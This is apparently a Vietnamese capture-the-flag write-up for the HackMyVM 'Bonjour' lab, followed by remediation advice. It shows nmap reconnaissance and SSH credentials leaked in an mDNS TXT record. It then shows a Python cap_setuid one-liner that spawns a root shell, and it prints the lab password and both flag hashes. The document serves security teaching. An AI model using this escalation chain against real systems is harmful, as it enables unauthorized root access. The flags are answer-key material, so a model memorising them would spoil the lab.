# HackMyVM — Bonjour

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Bonjour (Target) | `10.0.2.7` |
| SSH | `22/tcp` — OpenSSH 10.0p2 Debian 7+deb13u2 |
| mDNS/Zeroconf | `5353/udp` |
| Tài khoản | `user` |
| Mật khẩu | `Aroipo902!` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: kiểm tra kết nối, quét dịch vụ và SSH vào Target.
> - 🟥 **Terminal Bonjour**: kiểm tra tài khoản, quyền hạn, capability và đọc flag.
>
> Không chạy nhầm lệnh giữa 2 máy.

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định IP máy Target

### 🟦 Kali

Target của bài:

```text
10.0.2.7
```

Kiểm tra kết nối:

```bash
ping -c 4 10.0.2.7
```

Kết quả:

```text
4 packets transmitted, 4 received, 0% packet loss
rtt min/avg/max/mdev = 0.267/0.433/0.593/0.115 ms
```

Máy Target đang hoạt động và có thể kết nối từ Kali.

---

## 1.2. Quét toàn bộ cổng TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 --min-rate 5000 10.0.2.7
```

Kết quả quan trọng:

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

Nmap ghi nhận:

```text
65534 closed tcp ports
```

Như vậy, cổng TCP duy nhất được phát hiện đang mở là:

```text
22/tcp — SSH
```

---

## 1.3. Nhận diện dịch vụ và phiên bản

### 🟦 Kali

```bash
nmap -p 22 -sCV -Pn -T4 10.0.2.7
```

Kết quả:

```text
22/tcp open  ssh  OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
```

Thông tin hệ điều hành do Nmap nhận diện:

```text
OS: Linux
CPE: cpe:/o:linux:linux_kernel
```

Target sử dụng SSH trên nền Linux/Debian.

---

## 1.4. Quét UDP

### 🟦 Kali

Quét 100 cổng UDP phổ biến:

```bash
sudo nmap -sU --top-ports 100 -T2 --max-retries 2 10.0.2.7
```

Kết quả:

```text
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
5353/udp open          zeroconf
```

Trong đó:

- `68/udp` ở trạng thái `open|filtered`, chưa thể khẳng định chắc chắn dịch vụ đang mở.
- `5353/udp` được xác nhận mở và cung cấp dịch vụ Zeroconf/mDNS.

---

## 1.5. Khai thác thông tin từ mDNS/Zeroconf

### 🟦 Kali

Sử dụng script `dns-service-discovery` của Nmap:

```bash
sudo nmap -sU -p 5353 \
  --script=dns-service-discovery \
  -T4 \
  10.0.2.7
```

Kết quả quan trọng:

```text
5353/udp open  zeroconf
| dns-service-discovery:
|   22/tcp ssh:
|     ipv4: 10.0.2.7
|     name: debian SSH
|     hostname: debian
|     TXT:
|_      username=user password=Aroipo902!
```

Dịch vụ mDNS công khai thông tin xác thực SSH trong bản ghi TXT:

```text
Username: user
Password: Aroipo902!
```

Đây là điểm yếu dẫn đến quyền truy cập ban đầu.

---

## 1.6. Xác định điểm vào

Từ kết quả trinh sát:

```text
5353/udp mDNS/Zeroconf
        ↓
Rò rỉ username và password trong TXT record
        ↓
22/tcp SSH
        ↓
Đăng nhập tài khoản user
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác các cấu hình bảo mật yếu trên máy để đạt được quyền truy cập ban đầu, nâng cao đặc quyền và chứng minh mức độ kiểm soát hệ thống bằng cách tìm và thu thập `user.txt` và `root.txt`.**

## 2.1. Phương thức truy cập ban đầu

Điểm yếu được sử dụng:

```text
mDNS TXT record làm lộ thông tin đăng nhập SSH
```

Thông tin xác thực thu được:

```text
user : Aroipo902!
```

---

## 2.2. SSH vào Bonjour

### 🟦 Kali

```bash
ssh user@10.0.2.7
```

Nhập mật khẩu:

```text
Aroipo902!
```

Sau khi đăng nhập thành công, terminal chuyển sang Target:

### 🟥 Bonjour

```text
user@debian:~$
```

Kiểm tra người dùng hiện tại:

```bash
whoami
```

Kết quả:

```text
user
```

Kiểm tra UID, GID và các nhóm:

```bash
id
```

Kết quả:

```text
uid=1000(user) gid=1000(user) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

Kiểm tra hostname:

```bash
hostname
```

Kết quả:

```text
debian
```

Như vậy đã đạt được quyền truy cập ban đầu với tài khoản:

```text
user
```

---

## 2.3. Tìm và đọc user.txt

### 🟥 Bonjour

```bash
cat /home/user/user.txt
```

Kết quả:

```text
87e9d005abf182cf3ab905d009c90e3e49e1b1049862de64ae2f94c76ddec3bd
```

**Bằng chứng:** đã truy cập thành công tài khoản `user` và đọc được `user.txt`.

---

## 2.4. Kiểm tra quyền sudo

### 🟥 Bonjour

```bash
sudo -l
```

Sau khi nhập mật khẩu của `user`, hệ thống trả về:

```text
Désolé, l'utilisateur user ne peut pas utiliser sudo sur debian.
```

Nội dung này cho biết tài khoản `user` không được phép sử dụng `sudo` trên máy `debian`.

Vì không thể leo thang đặc quyền qua `sudo`, cần tiếp tục kiểm tra các cấu hình đặc quyền khác.

---

## 2.5. Liệt kê Linux capabilities

### 🟥 Bonjour

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Kết quả đáng chú ý:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Capability `cap_setuid=ep` cho phép tiến trình Python thay đổi UID hiệu lực mà không cần sử dụng `sudo`.

Đây là cấu hình nguy hiểm vì một người dùng thông thường có thể yêu cầu Python chuyển UID của tiến trình thành:

```text
0 — root
```

---

## 2.6. Leo thang đặc quyền qua Python capability

### 🟥 Bonjour

Thực thi Python 3.13, đặt UID thành `0`, sau đó mở Bash:

```bash
python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Prompt chuyển thành:

```text
root@debian:~#
```

Kiểm tra quyền hiện tại:

```bash
id
```

Kết quả:

```text
uid=0(root) gid=1000(user) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

Kiểm tra lại bằng:

```bash
whoami
```

Kết quả:

```text
root
```

Mặc dù GID vẫn là `1000(user)`, UID hiệu lực đã là `0`; vì vậy tiến trình Bash đang có quyền root.

---

## 2.7. Lấy root.txt

### 🟥 Bonjour

```bash
cat /root/root.txt
```

Kết quả:

```text
79965b8036fe42fa255e8810e562a556d931406430ec54b619aff1916668e2b3
```

**Bằng chứng:** đã leo thang đặc quyền thành công và đọc được `root.txt`.

---

## 2.8. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────┐
│ 🟦 KALI                │
│ 10.0.2.15              │
└───────────┬────────────┘
            │
            │ UDP scan + mDNS discovery
            ▼
┌────────────────────────┐
│ 5353/udp Zeroconf      │
│ TXT record rò rỉ       │
│ user / Aroipo902!      │
└───────────┬────────────┘
            │
            │ SSH 22/tcp
            ▼
┌────────────────────────┐
│ 🟥 BONJOUR / DEBIAN    │
│ user@debian            │
│ Đọc user.txt           │
└───────────┬────────────┘
            │
            │ getcap -r /
            ▼
┌────────────────────────┐
│ python3.13             │
│ cap_setuid=ep          │
└───────────┬────────────┘
            │
            │ os.setuid(0)
            ▼
┌────────────────────────┐
│ uid=0(root)            │
│ Đọc /root/root.txt     │
└────────────────────────┘
```

---

## 2.9. Hai terminal — làm theo thứ tự

### 🟦 TERMINAL KALI

```bash
# 1. Kiểm tra kết nối
ping -c 4 10.0.2.7

# 2. Quét toàn bộ TCP
nmap -p- -Pn -T4 --min-rate 5000 10.0.2.7

# 3. Nhận diện dịch vụ SSH
nmap -p 22 -sCV -Pn -T4 10.0.2.7

# 4. Quét các cổng UDP phổ biến
sudo nmap -sU --top-ports 100 -T2 --max-retries 2 10.0.2.7

# 5. Khai thác thông tin mDNS
sudo nmap -sU -p 5353 \
  --script=dns-service-discovery \
  -T4 \
  10.0.2.7

# 6. SSH vào Target
ssh user@10.0.2.7
```

Sau khi nhập mật khẩu `Aroipo902!`, giữ phiên SSH mở và tiếp tục trong terminal Target.

### 🟥 TERMINAL BONJOUR

```bash
# 7. Kiểm tra tài khoản và máy
whoami
id
hostname

# 8. Đọc user flag
cat /home/user/user.txt

# 9. Kiểm tra sudo
sudo -l

# 10. Liệt kê capabilities
/usr/sbin/getcap -r / 2>/dev/null

# 11. Leo thang đặc quyền
python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 12. Xác nhận root
id
whoami

# 13. Đọc root flag
cat /root/root.txt
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục nhằm ngăn chặn việc truy cập trái phép, leo thang đặc quyền và bảo vệ các tài nguyên quan trọng của hệ thống.**

## 3.1. Nguyên nhân chính

Khả năng chiếm quyền hệ thống xuất phát từ hai cấu hình yếu kết hợp với nhau.

### 1. Rò rỉ thông tin xác thực qua mDNS

Dịch vụ Zeroconf công khai bản ghi TXT chứa:

```text
username=user password=Aroipo902!
```

Người trong cùng phân đoạn mạng có thể truy vấn mDNS và thu được tài khoản SSH hợp lệ.

### 2. Cấp `CAP_SETUID` cho Python

File thực thi:

```text
/usr/bin/python3.13
```

được gán:

```text
cap_setuid=ep
```

Python là trình thông dịch đa năng, cho phép chạy mã tùy ý. Khi được cấp `CAP_SETUID`, bất kỳ người dùng nào có thể thực thi file này đều có khả năng chuyển UID của tiến trình thành `0` và mở shell root.

### 3. Chuỗi tác động

```text
Credential bị lộ qua mDNS
            +
SSH cho phép đăng nhập bằng mật khẩu
            +
Python có CAP_SETUID
            =
Truy cập ban đầu → root
```

---

## 3.2. Biện pháp khắc phục

### Xóa credential khỏi bản ghi mDNS

Không lưu hoặc quảng bá username, password, token hay thông tin nhạy cảm trong TXT record.

Chỉ công khai dữ liệu tối thiểu cần thiết, chẳng hạn tên dịch vụ, hostname và cổng.

### Tắt mDNS/Zeroconf nếu không cần thiết

Nếu máy chủ không cần discovery nội bộ, nên tắt dịch vụ mDNS/Avahi và chặn `5353/udp` bằng firewall.

Nếu vẫn cần sử dụng, chỉ cho phép trong phân đoạn mạng tin cậy và kiểm soát nội dung được quảng bá.

### Thu hồi capability khỏi Python

Quản trị viên có thể xóa capability nguy hiểm bằng:

```bash
sudo setcap -r /usr/bin/python3.13
```

Sau đó xác minh:

```bash
getcap /usr/bin/python3.13
```

Lệnh không nên trả về `cap_setuid=ep`.

### Không cấp capability đặc quyền cho trình thông dịch

Không gán `CAP_SETUID`, `CAP_DAC_OVERRIDE`, `CAP_SYS_ADMIN` hoặc capability có mức ảnh hưởng cao cho các chương trình có thể thực thi mã tùy ý như:

```text
python
perl
ruby
php
node
```

Nếu một chức năng thực sự cần đặc quyền, nên tạo chương trình chuyên biệt, giới hạn chặt đầu vào và chỉ cấp capability tối thiểu cần thiết.

### Gia cố SSH

- Thay đổi ngay mật khẩu đã bị lộ.
- Ưu tiên xác thực bằng khóa công khai.
- Tắt đăng nhập bằng mật khẩu nếu điều kiện vận hành cho phép.
- Giới hạn nguồn được truy cập cổng `22/tcp` bằng firewall.
- Theo dõi các lần đăng nhập thất bại và bất thường.

### Kiểm tra capabilities định kỳ

Thực hiện rà soát định kỳ:

```bash
getcap -r / 2>/dev/null
```

Đối chiếu kết quả với danh sách cấu hình chuẩn, loại bỏ capability không cần thiết và cảnh báo khi có thay đổi trái phép.

### Áp dụng nguyên tắc đặc quyền tối thiểu

- Tài khoản thông thường không được có đường leo thang trực tiếp lên UID `0`.
- Dịch vụ chỉ chạy với quyền cần thiết.
- Hạn chế quyền đọc đối với file cấu hình và dữ liệu bí mật.
- Kiểm tra permission, SUID, SGID, sudoers và Linux capabilities thường xuyên.

### Logging và giám sát

Theo dõi:

- Truy vấn mDNS bất thường.
- Các phiên đăng nhập SSH mới.
- Việc thực thi Python gọi `setuid()`.
- Tiến trình có UID `0` nhưng GID hoặc nguồn khởi tạo bất thường.
- Các thay đổi đối với extended attributes và file capabilities.

---

# Kết luận ngắn gọn

## Câu 1

Target:

```text
10.0.2.7
```

Dịch vụ được xác nhận:

```text
22/tcp   SSH — OpenSSH 10.0p2 Debian 7+deb13u2
5353/udp Zeroconf/mDNS
```

mDNS làm lộ:

```text
user : Aroipo902!
```

## Câu 2

Initial access:

```text
mDNS credential leak → SSH → user
```

User flag:

```text
87e9d005abf182cf3ab905d009c90e3e49e1b1049862de64ae2f94c76ddec3bd
```

Điểm leo thang đặc quyền:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Khai thác:

```text
os.setuid(0) → /bin/bash → uid=0(root)
```

Root flag:

```text
79965b8036fe42fa255e8810e562a556d931406430ec54b619aff1916668e2b3
```

## Câu 3

Khắc phục trọng tâm:

```text
Xóa credential khỏi mDNS TXT record
            +
Tắt hoặc giới hạn Zeroconf/mDNS
            +
Thu hồi CAP_SETUID khỏi Python
            +
Gia cố SSH
            +
Least Privilege
            +
Kiểm tra capability + Logging + Monitoring
```
